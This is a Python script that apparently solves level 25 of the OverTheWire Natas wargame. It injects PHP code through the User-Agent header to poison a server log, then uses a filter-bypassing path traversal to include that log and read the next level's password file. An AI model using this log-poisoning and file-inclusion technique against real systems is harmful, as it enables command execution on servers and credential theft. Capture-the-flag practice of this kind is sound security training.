# Import Library
import requests
import re
from string import *

# Setting variables needed
username = 'natas25'
password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'

url=f'http://{username}.natas.labs.overthewire.org/'
pw = []

headers = {"User-Agent":"<?php system('cat /etc/natas_webpass/natas26');?>"}

# Connect to natas
session = requests.session()
response = session.request('POST', url, auth=(username,password))

payloads = {"lang" :
                "..././..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_"+session.cookies['PHPSESSID']+".log"}
response = session.request('POST', url, auth=(username,password),headers=headers,data=payloads)

print(session.cookies)

# Filtering to get a password
#result = re.findall('Password: (.*)</pre>', response.text)[0]
print(response.text)
